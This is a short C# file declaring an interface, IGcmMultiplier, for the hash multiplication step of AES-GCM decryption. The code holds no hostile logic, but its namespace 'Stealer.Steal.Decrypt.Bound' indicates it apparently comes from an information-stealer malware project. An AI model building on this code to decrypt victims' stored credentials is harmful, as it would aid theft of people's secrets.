namespace Stealer.Steal.Decrypt.Bound;

public interface IGcmMultiplier
{
	void Init(byte[] H);

	void MultiplyH(byte[] x);
}
